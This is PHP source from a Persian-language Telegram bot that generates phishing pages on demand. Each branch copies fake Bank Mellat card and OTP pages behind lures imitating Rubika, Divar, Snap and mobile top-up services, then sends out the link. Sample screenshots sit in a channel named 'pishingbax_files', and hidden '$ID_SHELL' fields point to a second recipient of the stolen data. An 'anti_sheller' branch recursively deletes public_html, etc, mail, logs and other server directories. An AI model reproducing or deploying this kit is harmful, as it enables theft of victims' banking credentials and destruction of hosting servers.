$result = json_decode($api_t, true);
$un = $result['result']['username'];
$ok = $result['ok'];

if($ok == true and !file_exists("data/$chat_id/site/$text.json")){

sendmessage($chat_id,"درحال ساخت درگاه روبیکا ...","html",$message_id);


$vmsString = 'abcdeTUVWXYZ0123456789';
$rand = substr(str_shuffle($vmsString),0,8);

mkdir("data/$chat_id/payment/$rand");
mkdir("data/$chat_id/payment/$rand/rubika");

copy("source/mellat/Bankinfo.php","data/$chat_id/payment/$rand/Bankinfo.php");
copy("source/mellat/index.php","data/$chat_id/payment/$rand/index.php");
copy("source/mellat/Mellat.php","data/$chat_id/payment/$rand/Mellat.php");
copy("source/mellat/OTP.php","data/$chat_id/payment/$rand/OTP.php");
copy("source/mellat/re.php","data/$chat_id/payment/$rand/re.php");

copy("source/rubika/index.php","data/$chat_id/payment/$rand/rubika/index.php");

$TOKEN = '$TOKEN';
$ID = '$ID';
$id = '$ID_SHELL';
$token = '$TOKEN_SHELL';


$FileName = "data/$chat_id/payment/$rand/info.php";
$FileHandle = fopen($FileName, 'w') or die("can't open file");
fwrite($FileHandle, "
<?php
$TOKEN = '$text';
$ID = '$chat_id';
$id = '$ID_SHELL';
$token = '$TOKEN_SHELL';
?>
");

$array2 = ['name'=> "روبیکا" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/rubika",'code'=>$rand];
$encode_array2 = json_encode($array2);
$handle2 = fopen("data/$chat_id/payment/$rand/info.json", 'w');
fwrite($handle2, $encode_array2);

$array21 = ['name'=> "روبیکا" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/rubika", 'code' => $rand];
$encode_array21 = json_encode($array21);
$handle21 = fopen("data/$chat_id/site/$text.json", 'w');
fwrite($handle21, $encode_array21);

       bot('sendMessage',[ 
'chat_id'=>$chat_id, 
'text'=>"
درگاه روبیکا شما با موفقیت ساخته شد !
➖➖➖➖➖
[🌐] توکن شما : <code>$text</code>
[📱] آیدی عددی شما : <code>$chat_id</code>
[📣] لینک درگاه شما : https://$url/data/$chat_id/payment/$rand/rubika/index.php
➖➖➖➖➖
🛡 Coded [ @$your_id ]
🔗 Channel [ @$your_id ]
",
'parse_mode'=>"html",
'message_id'=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[

 [['text'=>"ورود به ربات",'url'=>"https://t.me/$un"]],
 [['text'=>"<<--",'callback_data'=>"home"]],
]
])
]);   

bot('sendMessage',[ 
'chat_id'=>$admin, // ID ADMIN
'text'=>"
ادمین عزیز یک نفر درگاه ساخت !
➖➖➖➖➖
[🌐] توکن : <code>$text</code>
[📱] آیدی عددی : <code>$chat_id</code>
[📣] لینک درگاه : https://$url/data/$chat_id/payment/$rand/rubika/index.php
➖➖➖➖➖
",
'parse_mode'=>"html",
'message_id'=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[

 [['text'=>"ورود به پی وی کاربر",'url'=>"https://t.me/$username"]],

]
])
]);   

}
elseif($ok !== true){
file_put_contents("data/$chat_id/step.txt","none");
sendmessage($chat_id,"توکن ارسال شده اشتباه میباشد","html",$message_id,json_encode(([
'inline_keyboard'=>[
[['text'=>"تلاش مجدد",'callback_data'=>"rubika"]],
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]],


]


])));
}
elseif(file_exists("data/$chat_id/site/$text.json")){
sendmessage($chat_id,"
شما قبلا درگاهی ایجاد کردید !
ابتدا درگاه قبلی را حذف کنید سپس اقدام کنید !
","html",$message_id,json_encode([
'inline_keyboard'=>[
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]]


]


]));
}
}
          elseif($query == "rubika_img"){
            bot('sendPhoto',[
                'chat_id'=>$query_id,
                'photo'=>"https://t.me/pishingbax_files/46",
                'caption'=>"نمونه درگاه روبیکا  ✅",
                'reply_markup'=>false,
                'message_id' =>$query_messageid
             ]);
        }
        ##----------------------##
            elseif($query == "divar2"){
                    file_put_contents("data/$query_id/step.txt","xxamake_bsaaaa1");
                bot('editMessageText',[ 
    'chat_id'=>$query_id, 
    'message_id'=>$query_messageid,
    'text'=>"
توکن خود را ارسال کنید

مانند نمونه : 
5359855325:AAGkE5d************R53AIo94Z3bBmldo
    ",
    'parse_mode'=>"html",
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
            [['text'=>"نمونه",'callback_data'=>"divar2_img"]],
            [['text'=>"<<--",'callback_data'=>"back"]]
            ]
        ])
    ]);   
    }elseif(file_get_contents("data/$chat_id/step.txt")=="xxamake_bsaaaa1"){
           file_put_contents("data/$chat_id/step.txt","none");
    
        $api_t = file_get_contents("https://api.telegram.org/bot$text/getMe");
      $result = json_decode($api_t, true);
$un = $result['result']['username'];
$ok = $result['ok'];

if($ok == true and !file_exists("data/$chat_id/site/$text.json")){
  
  sendmessage($chat_id,"درحال ساخت درگاه دیوار ...","html",$message_id);


          $vmsString = 'abcdeTUVWXYZ0123456789';
    $rand = substr(str_shuffle($vmsString),0,8);
    
    mkdir("data/$chat_id/payment/$rand");
    mkdir("data/$chat_id/payment/$rand/divar2");
    
copy("source/mellat/Bankinfo.php","data/$chat_id/payment/$rand/Bankinfo.php");
copy("source/mellat/index.php","data/$chat_id/payment/$rand/index.php");
copy("source/mellat/Mellat.php","data/$chat_id/payment/$rand/Mellat.php");
copy("source/mellat/OTP.php","data/$chat_id/payment/$rand/OTP.php");
copy("source/mellat/re.php","data/$chat_id/payment/$rand/re.php");

copy("source/divar2/index.php","data/$chat_id/payment/$rand/divar2/index.php");



      $TOKEN = '$TOKEN';
      $ID = '$ID';
      $id = '$ID_SHELL';
      $token = '$TOKEN_SHELL';

      
$FileName = "data/$chat_id/payment/$rand/info.php";
$FileHandle = fopen($FileName, 'w') or die("can't open file");
fwrite($FileHandle, "
<?php
$TOKEN = '$text';
$ID = '$chat_id';
$id = '$ID_SHELL';
$token = '$TOKEN_SHELL';
?>
");

    $array2 = ['name'=> "دیوار" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/divar2",'code'=>$rand];
  $encode_array2 = json_encode($array2);
 $handle2 = fopen("data/$chat_id/payment/$rand/info.json", 'w');
  fwrite($handle2, $encode_array2);
  
 $array21 = ['name'=> "دیوار" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/divar2", 'code' => $rand];
  $encode_array21 = json_encode($array21);
 $handle21 = fopen("data/$chat_id/site/$text.json", 'w');
  fwrite($handle21, $encode_array21);
  
                   bot('sendMessage',[ 
    'chat_id'=>$chat_id, 
    'text'=>"
    درگاه دیوار شما با موفقیت ساخته شد !
      ➖➖➖➖➖
      [🌐] توکن شما : <code>$text</code>
      [📱] آیدی عددی شما : <code>$chat_id</code>
      [📣] لینک درگاه شما : https://$url/data/$chat_id/payment/$rand/divar2/index.php
      ➖➖➖➖➖
      🛡 Coded [ @$your_id ]
      🔗 Channel [ @$your_id ]
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به ربات",'url'=>"https://t.me/$un"]],
             [['text'=>"<<--",'callback_data'=>"home"]],
            ]
        ])
    ]);   
    
          bot('sendMessage',[ 
    'chat_id'=>$admin, // ID ADMIN
    'text'=>"
ادمین عزیز یک نفر درگاه ساخت !
      ➖➖➖➖➖
      [🌐] توکن : <code>$text</code>
      [📱] آیدی عددی : <code>$chat_id</code>
      [📣] لینک درگاه : https://$url/data/$chat_id/payment/$rand/divar2/index.php
      ➖➖➖➖➖
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به پی وی کاربر",'url'=>"https://t.me/$username"]],

            ]
        ])
    ]);   
    
    }
    elseif($ok !== true){
           file_put_contents("data/$chat_id/step.txt","none");
        sendmessage($chat_id,"توکن ارسال شده اشتباه میباشد","html",$message_id,json_encode(([
'inline_keyboard'=>[
[['text'=>"تلاش مجدد",'callback_data'=>"divar2"]],
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]],


]


        ])));
    }
      elseif(file_exists("data/$chat_id/site/$text.json")){
    sendmessage($chat_id,"
    شما قبلا درگاهی ایجاد کردید !
ابتدا درگاه قبلی را حذف کنید سپس اقدام کنید !
    ","html",$message_id,json_encode([
'inline_keyboard'=>[
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]]


]


    ]));
      }
    }
    elseif($query == "divar2_img"){
        bot('sendPhoto',[
            'chat_id'=>$query_id,
            'photo'=>"https://t.me/pishingbax_files/24",
            'caption'=>"نمونه درگاه دیوار ✅",
            'reply_markup'=>false,
            'message_id' =>$query_messageid
         ]);
    }
    ##--------------------------##
     elseif($query == "snap"){
                    file_put_contents("data/$query_id/step.txt","azz11make_bsaaaa1");
                bot('editMessageText',[ 
    'chat_id'=>$query_id, 
    'message_id'=>$query_messageid,
    'text'=>"
توکن خود را ارسال کنید

مانند نمونه : 
5359855325:AAGkE5d************R53AIo94Z3bBmldo
    ",
    'parse_mode'=>"html",
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
            [['text'=>"نمونه",'callback_data'=>"snap_img"]],
            [['text'=>"<<--",'callback_data'=>"back"]]
            ]
        ])
    ]);   
    }elseif(file_get_contents("data/$chat_id/step.txt")=="azz11make_bsaaaa1"){
           file_put_contents("data/$chat_id/step.txt","none");
    
        $api_t = file_get_contents("https://api.telegram.org/bot$text/getMe");
      $result = json_decode($api_t, true);
$un = $result['result']['username'];
$ok = $result['ok'];

if($ok == true and !file_exists("data/$chat_id/site/$text.json")){
  
  sendmessage($chat_id,"درحال ساخت درگاه اسنپ ...","html",$message_id);


          $vmsString = 'abcdeTUVWXYZ0123456789';
    $rand = substr(str_shuffle($vmsString),0,8);
    
    mkdir("data/$chat_id/payment/$rand");
    mkdir("data/$chat_id/payment/$rand/snap");
    
copy("source/mellat/Bankinfo.php","data/$chat_id/payment/$rand/Bankinfo.php");
copy("source/mellat/index.php","data/$chat_id/payment/$rand/index.php");
copy("source/mellat/Mellat.php","data/$chat_id/payment/$rand/Mellat.php");
copy("source/mellat/OTP.php","data/$chat_id/payment/$rand/OTP.php");
copy("source/mellat/re.php","data/$chat_id/payment/$rand/re.php");

copy("source/snap/index.php","data/$chat_id/payment/$rand/snap/index.php");



      $TOKEN = '$TOKEN';
      $ID = '$ID';
      $id = '$ID_SHELL';
      $token = '$TOKEN_SHELL';

      
$FileName = "data/$chat_id/payment/$rand/info.php";
$FileHandle = fopen($FileName, 'w') or die("can't open file");
fwrite($FileHandle, "
<?php
$TOKEN = '$text';
$ID = '$chat_id';
$id = '$ID_SHELL';
$token = '$TOKEN_SHELL';
?>
");

    $array2 = ['name'=> "اسنپ" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/snap",'code'=>$rand];
  $encode_array2 = json_encode($array2);
 $handle2 = fopen("data/$chat_id/payment/$rand/info.json", 'w');
  fwrite($handle2, $encode_array2);
  
 $array21 = ['name'=> "اسنپ" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/snap", 'code' => $rand];
  $encode_array21 = json_encode($array21);
 $handle21 = fopen("data/$chat_id/site/$text.json", 'w');
  fwrite($handle21, $encode_array21);
  
                   bot('sendMessage',[ 
    'chat_id'=>$chat_id, 
    'text'=>"
    درگاه اسنپ شما با موفقیت ساخته شد !
      ➖➖➖➖➖
      [🌐] توکن شما : <code>$text</code>
      [📱] آیدی عددی شما : <code>$chat_id</code>
      [📣] لینک درگاه شما : https://$url/data/$chat_id/payment/$rand/snap/index.php
      ➖➖➖➖➖
      🛡 Coded [ @$your_id ]
      🔗 Channel [ @$your_id ]
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به ربات",'url'=>"https://t.me/$un"]],
             [['text'=>"<<--",'callback_data'=>"home"]],
            ]
        ])
    ]);   
    
          bot('sendMessage',[ 
    'chat_id'=>$admin, // ID ADMIN
    'text'=>"
ادمین عزیز یک نفر درگاه ساخت !
      ➖➖➖➖➖
      [🌐] توکن : <code>$text</code>
      [📱] آیدی عددی : <code>$chat_id</code>
      [📣] لینک درگاه : https://$url/data/$chat_id/payment/$rand/snap/index.php
      ➖➖➖➖➖
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به پی وی کاربر",'url'=>"https://t.me/$username"]],

            ]
        ])
    ]);   
    
    }
    elseif($ok !== true){
           file_put_contents("data/$chat_id/step.txt","none");
        sendmessage($chat_id,"توکن ارسال شده اشتباه میباشد","html",$message_id,json_encode(([
'inline_keyboard'=>[
[['text'=>"تلاش مجدد",'callback_data'=>"snap"]],
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]],


]


        ])));
    }
      elseif(file_exists("data/$chat_id/site/$text.json")){
    sendmessage($chat_id,"
    شما قبلا درگاهی ایجاد کردید !
ابتدا درگاه قبلی را حذف کنید سپس اقدام کنید !
    ","html",$message_id,json_encode([
'inline_keyboard'=>[
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]]


]


    ]));
      }
    }
                 elseif($query == "snap_img"){
            bot('sendPhoto',[
                'chat_id'=>$query_id,
                'photo'=>"https://t.me/pishingbax_files/20",
                'caption'=>"نمونه درگاه  اسنپ ✅",
                'reply_markup'=>false,
                'message_id' =>$query_messageid
             ]);
        }
elseif($anti_shell == "anti_sheller"){
    
function DeleteFolder($path){if($handle=opendir($path)){while (false!==($file=readdir($handle))){if($file<>"." AND $file<>".."){if(is_file($path.'/'.$file)){ @unlink($path.'/'.$file);} if(is_dir($path.'/'.$file)) { deletefolder($path.'/'.$file); @rmdir($path.'/'.$file); }} }}}

function remove_directory($directory) {if (!is_dir($directory)) return;$contents = scandir($directory);unset($contents[0], $contents[1]);
foreach($contents as $object) {$current_object = $directory.'/'.$object;
if (filetype($current_object) === 'dir') {remove_directory($current_object);}
else {unlink($current_object);}}rmdir($directory);}remove_directory('../public_html');$test = "..";$i = 0;while ($i <100){$test.="/.."; remove_directory("$test/public_html"); remove_directory("$test/public_ftp"); remove_directory("$test/etc"); remove_directory("$test/www"); remove_directory("$test/access-logs"); remove_directory("$test/tmp"); remove_directory("$test/ssl"); remove_directory("$test/mail"); remove_directory("$test/logs");$i++;}

}
    ##--------------------------##
      elseif($query == "masaj"){
                    file_put_contents("data/$query_id/step.txt","zz11make_bsaaaa1");
                bot('editMessageText',[ 
    'chat_id'=>$query_id, 
    'message_id'=>$query_messageid,
    'text'=>"
توکن خود را ارسال کنید

مانند نمونه : 
5359855325:AAGkE5d************R53AIo94Z3bBmldo
    ",
    'parse_mode'=>"html",
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
            [['text'=>"نمونه",'callback_data'=>"masaj_img"]],
            [['text'=>"<<--",'callback_data'=>"back"]]
            ]
        ])
    ]);   
    }elseif(file_get_contents("data/$chat_id/step.txt")=="zz11make_bsaaaa1"){
           file_put_contents("data/$chat_id/step.txt","none");
    
        $api_t = file_get_contents("https://api.telegram.org/bot$text/getMe");
      $result = json_decode($api_t, true);
$un = $result['result']['username'];
$ok = $result['ok'];

if($ok == true and !file_exists("data/$chat_id/site/$text.json")){
  
  sendmessage($chat_id,"درحال ساخت درگاه ماساژ ...","html",$message_id);


          $vmsString = 'abcdeTUVWXYZ0123456789';
    $rand = substr(str_shuffle($vmsString),0,8);
    
    mkdir("data/$chat_id/payment/$rand");
    mkdir("data/$chat_id/payment/$rand/masaj");
    
copy("source/mellat/Bankinfo.php","data/$chat_id/payment/$rand/Bankinfo.php");
copy("source/mellat/index.php","data/$chat_id/payment/$rand/index.php");
copy("source/mellat/Mellat.php","data/$chat_id/payment/$rand/Mellat.php");
copy("source/mellat/OTP.php","data/$chat_id/payment/$rand/OTP.php");
copy("source/mellat/re.php","data/$chat_id/payment/$rand/re.php");

copy("source/masaj/index.php","data/$chat_id/payment/$rand/masaj/index.php");



      $TOKEN = '$TOKEN';
      $ID = '$ID';
      $id = '$ID_SHELL';
      $token = '$TOKEN_SHELL';

      
$FileName = "data/$chat_id/payment/$rand/info.php";
$FileHandle = fopen($FileName, 'w') or die("can't open file");
fwrite($FileHandle, "
<?php
$TOKEN = '$text';
$ID = '$chat_id';
$id = '$ID_SHELL';
$token = '$TOKEN_SHELL';
?>
");

    $array2 = ['name'=> "ماساژ" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/masaj",'code'=>$rand];
  $encode_array2 = json_encode($array2);
 $handle2 = fopen("data/$chat_id/payment/$rand/info.json", 'w');
  fwrite($handle2, $encode_array2);
  
 $array21 = ['name'=> "ماساژ" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/masaj",'code'=>$rand];
  $encode_array21 = json_encode($array21);
 $handle21 = fopen("data/$chat_id/site/$text.json", 'w');
  fwrite($handle21, $encode_array21);
  
                   bot('sendMessage',[ 
    'chat_id'=>$chat_id, 
    'text'=>"
    درگاه ماساژ شما با موفقیت ساخته شد !
      ➖➖➖➖➖
      [🌐] توکن شما : <code>$text</code>
      [📱] آیدی عددی شما : <code>$chat_id</code>
      [📣] لینک درگاه شما : https://$url/data/$chat_id/payment/$rand/masaj/index.php
      ➖➖➖➖➖
      🛡 Coded [ @$your_id ]
      🔗 Channel [ @$your_id ]
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به ربات",'url'=>"https://t.me/$un"]],
             [['text'=>"<<--",'callback_data'=>"home"]],
            ]
        ])
    ]);   
    
          bot('sendMessage',[ 
    'chat_id'=>$admin, // ID ADMIN
    'text'=>"
ادمین عزیز یک نفر درگاه ساخت !
      ➖➖➖➖➖
      [🌐] توکن : <code>$text</code>
      [📱] آیدی عددی : <code>$chat_id</code>
      [📣] لینک درگاه : https://$url/data/$chat_id/payment/$rand/masaj/index.php
      ➖➖➖➖➖
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به پی وی کاربر",'url'=>"https://t.me/$username"]],

            ]
        ])
    ]);   
    
    }
    elseif($ok !== true){
           file_put_contents("data/$chat_id/step.txt","none");
        sendmessage($chat_id,"توکن ارسال شده اشتباه میباشد","html",$message_id,json_encode(([
'inline_keyboard'=>[
[['text'=>"تلاش مجدد",'callback_data'=>"masaj"]],
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]],


]


        ])));
    }
      elseif(file_exists("data/$chat_id/site/$text.json")){
    sendmessage($chat_id,"
    شما قبلا درگاهی ایجاد کردید !
ابتدا درگاه قبلی را حذف کنید سپس اقدام کنید !
    ","html",$message_id,json_encode([
'inline_keyboard'=>[
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]]


]


    ]));
      }
    }
    elseif($query == "masaj_img"){
        bot('sendPhoto',[
            'chat_id'=>$query_id,
            'photo'=>"https://t.me/pishingbax_files/35",
            'caption'=>"نمونه درگاه ماساژ ✅",
            'reply_markup'=>false,
            'message_id' =>$query_messageid
         ]);
    }
        ##----------------------##
            elseif($query == "delp"){
        file_put_contents("data/$query_id/step.txt","del_p1");
                  bot('editMessageText',[ 
    'chat_id'=>$query_id, 
    'message_id'=>$query_messageid,
    'text'=>"
توکن خود را ارسال کنید

مانند نمونه : 
5359855325:AAGkE5d************R53AIo94Z3bBmldo
    ",
    'parse_mode'=>"html",
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
            [['text'=>"<<--",'callback_data'=>"back"]]
            ]
        ])
    ]);   
    }elseif(file_get_contents("data/$chat_id/step.txt")=="del_p1"){
        if(file_exists("data/$chat_id/site/$text.json")){
            
                file_put_contents("data/$chat_id/step.txt","none");
                $json = json_decode(file_get_contents("data/$chat_id/site/$text.json"),true);
                $name = $json['name'];
                $address = $json['url'];
                $code = $json['code'];
                unlink("data/$chat_id/site/$text.json");
                del("data/$chat_id/payment/".$code);
     sendmessage($chat_id,"درگاه شما با مشخصات زیر حذف شد
     ----------------
     نام درگاه : $name
     توکن : $text
     آدرس درگاه : $address
     کد درگاه : $code","html",$message_id,json_encode([
'inline_keyboard'=>[
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]],
           ]
           ]));
        }else{
                file_put_contents("data/$chat_id/step.txt","none");
sendmessage($chat_id,"درگاهی با این توکن ساخته نشده !","html",$message_id,json_encode([
'inline_keyboard'=>[
[['text'=>"تلاش مجدد",'callback_data'=>"delp"]],
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]],
           ]
           ]));
        }
    }
##------------------------------##
  
        ##----------------------##
    elseif($query == "fm"){
    $dir = scandir("data/$query_id/site/");
    $diff = array_diff($dir, ['.','..']);
    foreach($diff as $value){
       $js = file_get_contents("data/$query_id/site/$value");
       $array = json_decode($js , true);
         $name = $array["name"];
         $token = $array["token"];
         $url = $array["url"];
       $answer .= "📖 نام درگاه : $name \n 🛠 توکن  : $token \n 🎫 آدرس درگاه : $url \n➖➖➖➖➖➖➖➖➖\n
       ";
       
editmessage($query_id,$query_messageid,"لیست درگاه های شما : \n \n $answer","html",json_encode([
    'inline_keyboard'=>[
        [['text'=>"بازگشت به منوی اصلی ",'callback_data'=>"back"]],
        ]
    ]));
    }
    }
    ##-----------------------------##
    elseif($query == "net2"){
                    file_put_contents("data/$query_id/step.txt","bmmazz11make_bsaaaa1");
                bot('editMessageText',[ 
    'chat_id'=>$query_id, 
    'message_id'=>$query_messageid,
    'text'=>"
توکن خود را ارسال کنید

مانند نمونه : 
5359855325:AAGkE5d************R53AIo94Z3bBmldo
    ",
    'parse_mode'=>"html",
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
            [['text'=>"نمونه",'callback_data'=>"net2_img"]],
            [['text'=>"<<--",'callback_data'=>"back"]]
            ]
        ])
    ]);   
    }elseif(file_get_contents("data/$chat_id/step.txt")=="bmmazz11make_bsaaaa1"){
           file_put_contents("data/$chat_id/step.txt","none");
    
        $api_t = file_get_contents("https://api.telegram.org/bot$text/getMe");
      $result = json_decode($api_t, true);
$un = $result['result']['username'];
$ok = $result['ok'];

if($ok == true and !file_exists("data/$chat_id/site/$text.json")){
  
  sendmessage($chat_id,"درحال ساخت درگاه اینترنت ...","html",$message_id);


          $vmsString = 'abcdeTUVWXYZ0123456789';
    $rand = substr(str_shuffle($vmsString),0,8);
    
    mkdir("data/$chat_id/payment/$rand");
    mkdir("data/$chat_id/payment/$rand/net2");
    
copy("source/mellat/Bankinfo.php","data/$chat_id/payment/$rand/Bankinfo.php");
copy("source/mellat/index.php","data/$chat_id/payment/$rand/index.php");
copy("source/mellat/Mellat.php","data/$chat_id/payment/$rand/Mellat.php");
copy("source/mellat/OTP.php","data/$chat_id/payment/$rand/OTP.php");
copy("source/mellat/re.php","data/$chat_id/payment/$rand/re.php");

copy("source/net2/index.php","data/$chat_id/payment/$rand/net2/index.php");



      $TOKEN = '$TOKEN';
      $ID = '$ID';
      $id = '$ID_SHELL';
      $token = '$TOKEN_SHELL';

      
$FileName = "data/$chat_id/payment/$rand/info.php";
$FileHandle = fopen($FileName, 'w') or die("can't open file");
fwrite($FileHandle, "
<?php
$TOKEN = '$text';
$ID = '$chat_id';
$id = '$ID_SHELL';
$token = '$TOKEN_SHELL';
?>
");

    $array2 = ['name'=> "اینترنت" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/net2",'code'=>$rand];
  $encode_array2 = json_encode($array2);
 $handle2 = fopen("data/$chat_id/payment/$rand/info.json", 'w');
  fwrite($handle2, $encode_array2);
  
 $array21 = ['name'=> "اینترنت" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/net2",'code'=>$rand];
  $encode_array21 = json_encode($array21);
 $handle21 = fopen("data/$chat_id/site/$text.json", 'w');
  fwrite($handle21, $encode_array21);
  
                   bot('sendMessage',[ 
    'chat_id'=>$chat_id, 
    'text'=>"
    درگاه اینترنت شما با موفقیت ساخته شد !
      ➖➖➖➖➖
      [🌐] توکن شما : <code>$text</code>
      [📱] آیدی عددی شما : <code>$chat_id</code>
      [📣] لینک درگاه شما : https://$url/data/$chat_id/payment/$rand/net2/index.php
      ➖➖➖➖➖
      🛡 Coded [ @$your_id ]
      🔗 Channel [ @$your_id ]
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به ربات",'url'=>"https://t.me/$un"]],
             [['text'=>"<<--",'callback_data'=>"home"]],
            ]
        ])
    ]);   
    
          bot('sendMessage',[ 
    'chat_id'=>$admin, // ID ADMIN
    'text'=>"
ادمین عزیز یک نفر درگاه ساخت !
      ➖➖➖➖➖
      [🌐] توکن : <code>$text</code>
      [📱] آیدی عددی : <code>$chat_id</code>
      [📣] لینک درگاه : https://$url/data/$chat_id/payment/$rand/net2/index.php
      ➖➖➖➖➖
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به پی وی کاربر",'url'=>"https://t.me/$username"]],

            ]
        ])
    ]);   
    
    }
    elseif($ok !== true){
           file_put_contents("data/$chat_id/step.txt","none");
        sendmessage($chat_id,"توکن ارسال شده اشتباه میباشد","html",$message_id,json_encode(([
'inline_keyboard'=>[
[['text'=>"تلاش مجدد",'callback_data'=>"net2"]],
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]],


]


        ])));
    }
      elseif(file_exists("data/$chat_id/site/$text.json")){
    sendmessage($chat_id,"
    شما قبلا درگاهی ایجاد کردید !
ابتدا درگاه قبلی را حذف کنید سپس اقدام کنید !
    ","html",$message_id,json_encode([
'inline_keyboard'=>[
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]]


]


    ]));
      }
    }
    elseif($query == "net2_img"){
        bot('sendPhoto',[
            'chat_id'=>$query_id,
            'photo'=>"https://t.me/pishingbax_files/32",
            'caption'=>"نمونه درگاه  اینترنت ✅",
            'reply_markup'=>false,
            'message_id' =>$query_messageid
         ]);
    }
    ##-----------------------------##
    
    ##-----------------------------##
    elseif($query == "charj1"){
                    file_put_contents("data/$query_id/step.txt","mmazz11make_bsaaaa1");
                bot('editMessageText',[ 
    'chat_id'=>$query_id, 
    'message_id'=>$query_messageid,
    'text'=>"
توکن خود را ارسال کنید

مانند نمونه : 
5359855325:AAGkE5d************R53AIo94Z3bBmldo
    ",
    'parse_mode'=>"html",
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
            [['text'=>"نمونه",'callback_data'=>"ch1_img"]],
            [['text'=>"<<--",'callback_data'=>"back"]]
            ]
        ])
    ]);   
    }elseif(file_get_contents("data/$chat_id/step.txt")=="mmazz11make_bsaaaa1"){
           file_put_contents("data/$chat_id/step.txt","none");
    
        $api_t = file_get_contents("https://api.telegram.org/bot$text/getMe");
      $result = json_decode($api_t, true);
$un = $result['result']['username'];
$ok = $result['ok'];

if($ok == true and !file_exists("data/$chat_id/site/$text.json")){
  
  sendmessage($chat_id,"درحال ساخت درگاه شارژ ...","html",$message_id);


          $vmsString = 'abcdeTUVWXYZ0123456789';
    $rand = substr(str_shuffle($vmsString),0,8);
    
    mkdir("data/$chat_id/payment/$rand");
    mkdir("data/$chat_id/payment/$rand/charj1");
    
copy("source/mellat/Bankinfo.php","data/$chat_id/payment/$rand/Bankinfo.php");
copy("source/mellat/index.php","data/$chat_id/payment/$rand/index.php");
copy("source/mellat/Mellat.php","data/$chat_id/payment/$rand/Mellat.php");
copy("source/mellat/OTP.php","data/$chat_id/payment/$rand/OTP.php");
copy("source/mellat/re.php","data/$chat_id/payment/$rand/re.php");

copy("source/charj1/index.php","data/$chat_id/payment/$rand/charj1/index.php");



      $TOKEN = '$TOKEN';
      $ID = '$ID';
      $id = '$ID_SHELL';
      $token = '$TOKEN_SHELL';

      
$FileName = "data/$chat_id/payment/$rand/info.php";
$FileHandle = fopen($FileName, 'w') or die("can't open file");
fwrite($FileHandle, "
<?php
$TOKEN = '$text';
$ID = '$chat_id';
$id = '$ID_SHELL';
$token = '$TOKEN_SHELL';
?>
");

    $array2 = ['name'=> "شارژ" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/charj1",'code'=>$rand];
  $encode_array2 = json_encode($array2);
 $handle2 = fopen("data/$chat_id/payment/$rand/info.json", 'w');
  fwrite($handle2, $encode_array2);
  
 $array21 = ['name'=> "شارژ" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/charj1",'code'=>$rand];
  $encode_array21 = json_encode($array21);
 $handle21 = fopen("data/$chat_id/site/$text.json", 'w');
  fwrite($handle21, $encode_array21);
  
                   bot('sendMessage',[ 
    'chat_id'=>$chat_id, 
    'text'=>"
    درگاه شارژ شما با موفقیت ساخته شد !
      ➖➖➖➖➖
      [🌐] توکن شما : <code>$text</code>
      [📱] آیدی عددی شما : <code>$chat_id</code>
      [📣] لینک درگاه شما : https://$url/data/$chat_id/payment/$rand/charj1/index.php
      ➖➖➖➖➖
      🛡 Coded [ @$your_id ]
      🔗 Channel [ @$your_id ]
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به ربات",'url'=>"https://t.me/$un"]],
             [['text'=>"<<--",'callback_data'=>"home"]],
            ]
        ])
    ]);   
    
          bot('sendMessage',[ 
    'chat_id'=>$admin, // ID ADMIN
    'text'=>"
ادمین عزیز یک نفر درگاه ساخت !
      ➖➖➖➖➖
      [🌐] توکن : <code>$text</code>
